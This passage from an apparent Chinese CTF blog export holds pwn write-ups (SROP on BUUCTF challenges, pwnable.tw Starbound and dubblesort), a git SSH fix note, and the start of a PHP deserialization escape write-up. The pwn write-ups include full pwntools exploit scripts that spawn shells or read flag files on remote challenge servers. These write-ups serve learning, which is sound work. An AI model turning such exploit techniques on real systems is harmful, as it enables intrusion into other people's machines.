<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909651.png" alt="image-20240206132903020"></p>
<p>​	程序中没有<code>/bin/sh</code>，所以我们要先往一个地址中写入<code>/bin/sh</code>。如果我们直接写入<code>/bin/sh</code>再<code>srop</code>，我们不能知道<code>/bin/sh</code>的地址，所以可以先栈迁移到<code>data</code>段，<code>data</code>段的地址已知且不变，这样我们就拿到<code>/bin/sh</code>的地址了，设置<code>read</code>的一些寄存器值，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buf_addr = <span class="number">0x402000</span></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span>  <span class="comment">#read的系统调用号</span></span><br><span class="line">frame.rdi = <span class="number">0</span>  <span class="comment">#标准输入</span></span><br><span class="line">frame.rsi = buf_addr  <span class="comment">#写入的位置的起始地址</span></span><br><span class="line">frame.rdx = <span class="number">0x400</span>  <span class="comment">#可以写入的字节个数</span></span><br><span class="line">frame.rip = syscall_leave_ret  <span class="comment">#syscall系统调用read</span></span><br><span class="line">frame.rbp = buf_addr+<span class="number">0x20</span></span><br></pre></td></tr></table></figure>

<p>不过这里<code>frame.rbp = buf_addr+0x20</code>的作用是什么？）</p>
<p>​	然后我们可以构造第一个<code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line"><span class="comment"># srop to call read, set *data_addr = /bin/sh\x00</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Hey, can i get some feedback for the CTF?\n&quot;</span>, payload)</span><br></pre></td></tr></table></figure>

<p>​	上面构造的<code>signal frame</code>再次<code>syscall</code>了一个<code>read</code>系统调用，下面我们就可以往<code>buf_addr = 0x402000</code>里写入<code>/bin/sh</code>，并再次构造一个<code>signal frame</code>系统调用<code>execve</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span>  <span class="comment">#execve的系统调用号</span></span><br><span class="line">frame.rdi = buf_addr  <span class="comment">#/bin/sh的地址</span></span><br><span class="line">frame.rsi = <span class="number">0</span>  <span class="comment">#第二个参数</span></span><br><span class="line">frame.rdx = <span class="number">0</span>  <span class="comment">#第三个参数</span></span><br><span class="line">frame.rip = syscall_leave_ret  <span class="comment">#</span></span><br><span class="line"><span class="comment">#frame.rbp =   #没有rbp了</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./srop&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26592</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">buf_addr = <span class="number">0x402000</span></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span> </span><br><span class="line">frame.rdi = <span class="number">0</span>  </span><br><span class="line">frame.rsi = buf_addr </span><br><span class="line">frame.rdx = <span class="number">0x400</span> </span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line">frame.rbp = buf_addr+<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Hey, can i get some feedback for the CTF?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span></span><br><span class="line">frame.rdi = buf_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909642.png" alt="image-20240206160012074"></p>
<h2 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a><code>360chunqiu2017_smallest</code></h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>我们每次控制寄存器的时候，都把<code>rsp</code>写成下一个片段的<code>rt_sigreturn</code>的地址，并且<code>rip</code>的地址要指向<code>syscall；ret</code> 一定要后面有<code>ret</code>，不然所有的片段连不起来，到<code>ret</code>的时候，就会去执行<code>rsp</code>执行的地址，因此我们就可以一直劫持程序的控制流。</p>
<p>​	程序很简单，只有下面一个函数，分析一下代码就是一个<code>read</code>系统调用，可以栈溢出并且能够溢出的字节数很长。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sys_read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;retaddr, <span class="number">0x400</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909763.png" alt="image-20240207130130852"></p>
<p>​	这道题既然是用<code>srop</code>，那么必然是需要能够调用<code>sigreturn</code>，也就是需要把<code>rax</code>寄存器的值设置为<code>0xf</code>。我们发现并没有能够实现这个的相关的<code>gadget</code>，但是我们突然想到<code>read</code>返回值就是存储在<code>rax</code>寄存器中的，我们可以利用这个来设置<code>rax</code>寄存器的值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">syscall_ret_addr = <span class="number">0x4000be</span></span><br><span class="line">start_addr = <span class="number">0x4000b0</span></span><br><span class="line">payload = p64(start_addr)*<span class="number">3</span></span><br><span class="line"><span class="comment">#第一个start去让第一次正常运行的ret返回到start</span></span><br><span class="line"><span class="comment">#第二个start让\xB3输入进来，此时去改变了栈顶的start，此时它跳过了xor rax,rax，并</span></span><br><span class="line"><span class="comment">#且它的下面还有一个start</span></span><br><span class="line"><span class="comment">#最下面的start是让我们可以再输入frame，一直控制程序执行流</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">p.send(<span class="string">b&#x27;\xB3&#x27;</span>)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">leak_addr = u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">target_addr = leak_addr-<span class="number">0x2000</span><span class="comment">#减去0x2000，把payload写到该地址</span></span><br></pre></td></tr></table></figure>

<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29210</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./smallest&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">syscall_ret_addr = <span class="number">0x4000be</span></span><br><span class="line">start_addr = <span class="number">0x4000b0</span></span><br><span class="line">payload = p64(start_addr)*<span class="number">3</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">p.send(<span class="string">b&#x27;\xB3&#x27;</span>)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">leak_addr = u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">target_addr = leak_addr-<span class="number">0x2000</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span>  </span><br><span class="line">frame.rdi = <span class="number">0</span>  </span><br><span class="line">frame.rsi = target_addr </span><br><span class="line">frame.rdx = <span class="number">0x400</span> </span><br><span class="line">frame.rip = syscall_ret_addr  </span><br><span class="line">frame.rsp = target_addr  </span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">payload = p64(syscall_ret_addr)+<span class="string">b&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">binsh_addr = target_addr+<span class="number">0x110</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span>  </span><br><span class="line">frame.rdi = binsh_addr  </span><br><span class="line">frame.rsi = <span class="number">0</span>  </span><br><span class="line">frame.rdx = <span class="number">0</span>  </span><br><span class="line">frame.rip = syscall_ret_addr</span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">bytes</span>(frame).ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">payload = p64(syscall_ret_addr)+<span class="string">b&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909062.png" alt="image-20240219151202950"></p>
]]></content>
      <categories>
        <category>pwn学习总结</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>SROP</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw writeup-Starbound</title>
    <url>/2024/07/26/Starbound/</url>
    <content><![CDATA[<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h4 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h4><p>要利用<code>add    esp, 0x1c</code>，先把该指令的地址写到一个地址，如图是<code>0x80580d0</code>，同时也获得了<code>/home/starbound/flag</code>的地址，为<code>0x80580d4</code></p>
<span id="more"></span>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202246246.png" alt="1"></p>
<p>数组*dword_8058154[v3]*的首地址为<code>0x8058154</code>，如图</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202246757.png" alt="2" style="zoom:67%;" />

<p>计算<code>0x80580d0</code>到<code>0x8058154</code>的偏移，为<code>0x84</code>，故索引为<code>-33</code>，即<code>doword_8058154[-33]</code>便是<code>0x80580d0</code>的地址。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202246993.png" alt="3"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./starbound&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10202</span>)</span><br><span class="line">debug(p)</span><br><span class="line">elf = ELF(<span class="string">&quot;./starbound&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">payload1,payload2</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter your name: &quot;</span>,payload1)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,payload2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">add    esp, 0x1c</span></span><br><span class="line"><span class="string">open(&quot;/home/starbound/flag&quot;,0)</span></span><br><span class="line"><span class="string">read(3,flag_addr,0x50)</span></span><br><span class="line"><span class="string">write(1,flag_addr,0x50)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add_esp_0x1c = <span class="number">0x08048e48</span></span><br><span class="line">file_addr = <span class="number">0x80580d4</span></span><br><span class="line">flag_addr = <span class="number">0x080580f0</span></span><br><span class="line">return_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload1 = p32(add_esp_0x1c)+<span class="string">b&#x27;/home/starbound/flag\x00&#x27;</span></span><br><span class="line">payload2 = <span class="string">b&#x27;-33\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(elf.plt[<span class="string">&#x27;open&#x27;</span>])+p32(return_addr)+p32(file_addr)+p32(<span class="number">0</span>)</span><br><span class="line">fun(payload1,payload2)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;-33\x00&#x27;</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span>+p32(elf.plt[<span class="string">&#x27;read&#x27;</span>])+p32(return_addr)+p32(<span class="number">3</span>)+p32(flag_addr)+p32(<span class="number">0x50</span>)</span><br><span class="line">fun(p32(add_esp_0x1c),payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;-33\x00&#x27;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">4</span>+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p32(return_addr)+p32(<span class="number">1</span>)+p32(flag_addr)+p32(<span class="number">0x50</span>)</span><br><span class="line">fun(p32(add_esp_0x1c),payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<em>flag</em></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202246405.png" alt="4"></p>
]]></content>
      <categories>
        <category>pwnable.tw刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw writeup-dubblsort</title>
    <url>/2024/07/17/dubblsort/</url>
    <content><![CDATA[<h3 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h3><p>对于<code>scanf(&quot;%u&quot;,v4)</code>，<code>%u</code>表示无符号整数</p>
<ul>
<li><p>当我们输入整数时，<em>scanf</em>认为其是合法字符，并将其写到<em>v4</em>中；</p>
<span id="more"></span>
</li>
<li><p>当我们输入字母时，<em>scanf</em>认为其是非法字符，并将其一直留在缓冲区，导致我们后面不能再继续输入数据；</p>
</li>
<li><p>当我们输入<code>+</code>或者<code>-</code>时，<em>scanf</em>会认为他是合法字符，同时又不会将其写到<em>v4</em>中。（因为<code>+</code>和<code>-</code>也可以用来定义数字的正负，所以<em>scanf</em>会认为其是合法的）</p>
</li>
</ul>
<p>有些时候我们可以利用<em>scanf</em>的这个漏洞，达到绕过<em>canary</em>的目的。</p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>保护：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237211.png" alt="1"></p>
<p>第一次<em>read</em>往<em>buf</em>写入<code>0x40</code>个字节，接着输入一个整数到<em>v8</em>，然后输入数据到栈中，这个过程循环<em>v8</em>次</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237767.png" alt="2"></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	在循环的过程中，每循环一次，往栈上输入数据的位置就<code>+1</code>，也就是说我们可以覆盖返回地址，但是同时也会覆盖<em>canary</em>。而我们又没办法泄漏<em>canary</em>，那能不能绕过修改<em>canary</em>的这一次循环呢？</p>
<p>对于<code>scanf(&quot;%u&quot;,v4)</code>，</p>
<ul>
<li>当我们输入整数时，<em>scanf</em>认为其是合法字符，并将其写到<em>v4</em>中；</li>
<li>当我们输入字母时，<em>scanf</em>认为其是非法字符，并将其一直留在缓冲区，导致我们后面不能再继续输入数据；</li>
<li>当我们输入<code>+</code>或者<code>-</code>时，<em>scanf</em>会认为他是合法字符，同时又不会将其写到<em>v4</em>中。（因为<code>+</code>和<code>-</code>也可以用来定义数字的正负，所以<em>scanf</em>会认为其是合法的）</li>
</ul>
<p>​	也就是说，假如<em>i&#x3D;11</em>时，我们该写入到<em>canary</em>这个位置，此时如果输入<code>+</code>，便能成功绕过<em>canary</em>。然后<em>i</em>也成功<code>+1</code>，接下来我们直接覆盖返回导致即可。</p>
<p>整体思路如下，</p>
<ol>
<li>计算偏移量，泄漏一个<em>libc</em>地址，算出<em>libc</em>基地址</li>
<li>绕过<em>canary</em>，覆盖返回地址</li>
</ol>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./dubblesort&#x27;)</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10101</span>)</span><br><span class="line">debug(p)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;What your name :&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">28</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">28</span>)</span><br><span class="line">leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log_addr(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">libc_base = leak-<span class="number">0x1b000a</span>   <span class="comment">#本地的offset是0x1840a</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;sort :&quot;</span>,<span class="built_in">str</span>(<span class="number">35</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;number : &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;number : &quot;</span>,<span class="built_in">str</span>(system))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(binsh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<em>flag</em></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202237403.png" alt="3"></p>
]]></content>
      <categories>
        <category>pwnable.tw刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>git时出现“Please make sure you have the correct access rights and the repository exists.”</title>
    <url>/2024/09/08/git%E6%97%B6%E5%87%BA%E7%8E%B0%E2%80%9CPlease-make-sure-you-have-the-correct-access-rights-and-the-repository-exists-%E2%80%9D/</url>
    <content><![CDATA[<p>这篇文章主要是记录一下自己之前在利用git这个命令时遇到的一些问题。</p>
<span id="more"></span>

<p>1、查看用户名和邮箱是否与自己之前设置的一样</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure>

<p>2、如果不一样或者忘了之前设置的是什么了，可以重置一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;邮箱&quot;</span></span><br></pre></td></tr></table></figure>

<p>3、删除本地<code>.ssh</code>目录下的<code>known_host</code>，<code>id_rsa</code>，<code>id_rsa.pub</code>文件，重新生成</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;邮箱&quot;</span></span><br></pre></td></tr></table></figure>

<p>4、在<code>github</code>中新建<code>ssh key</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202409080000711.png" alt="QQ_1725724833042"></p>
<p>复制<code>id_rsa.pub</code>中的全部内容，粘贴到该处，点击<code>Add SHH key</code>即可</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202409080002029.png" alt="QQ_1725724911246"></p>
<p>5、然后输入命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>

<p>​	到这一步后依然出错，我的是因为命名了密钥, 但是ssh连接默认是会使用默认名称的, 并不是放在<code>~./ssh</code>目录下就会自动读取，所以我通过使用<code>config</code>配置文件来解决这个问题。</p>
<p>6、在<code>.ssh</code>目录下添加文件<code>config</code>，在文件中添加下面内容</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">	<span class="keyword">User</span> <span class="title">git</span></span><br><span class="line">	IdentityFile ~/.ssh/私钥文件名称</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>php反序列化字符逃逸</title>
    <url>/2025/02/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p>php反序列化字符逃逸，其实就是利用过滤函数会使序列化字符串增长或缩短的特性，来构造新的序列化字符串进行攻击。</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>序列化字符串在经过过滤函数不正确的处理而导致对象注入，主要原因是<strong>过滤函数放在了<code>serialize</code>函数之后</strong>。</p>
<span id="more"></span>

<h2 id="缩短逃逸"><a href="#缩短逃逸" class="headerlink" title="缩短逃逸"></a>缩短逃逸</h2><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/weixin_44632787/article/details/119185112">BUUCTF之[安洵杯 2019]easy_serialize_php</a></p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];  <span class="comment">#从$_GET超全局数组中获取一个名为 f 的键的对应值，使用错误控制运算符 @ 来抑制可能发生的任何错误。GET传参f的值</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);   <span class="comment">#数组的键成为新变量的名称，而数组的值成为这些变量的值。</span></span><br><span class="line"><span class="comment">#_SESSION[phpflag] = ;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;   </span><br><span class="line"><span class="comment">#$_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">    <span class="comment">#将匹配的部分替换为空字符串(删除，这里好像可以双写绕过不确定)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="extract-函数"><a href="#extract-函数" class="headerlink" title="extract()函数"></a><code>extract()</code>函数</h4><p><code>extract()</code>函数用于将数组中的键值对转换为变量。使用<code>extract()</code>函数时，数组的键成为新变量的名称，而数组的值成为这些变量的值。</p>
<p>根据<code>extract()</code>我们可以进行变量覆盖，当我们传入<code>SESSION[flag]=123</code>时，<code>SESSION[&quot;user&quot;]</code>和<code>SESSION[&#39;function&#39;]</code>全部会消失,只剩下<code>SESSION[flag]=123</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;jt&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$arr</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#输出：jt</span></span><br></pre></td></tr></table></figure>

<h3 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// extract($_POST);</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>] = <span class="string">&#x27;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span 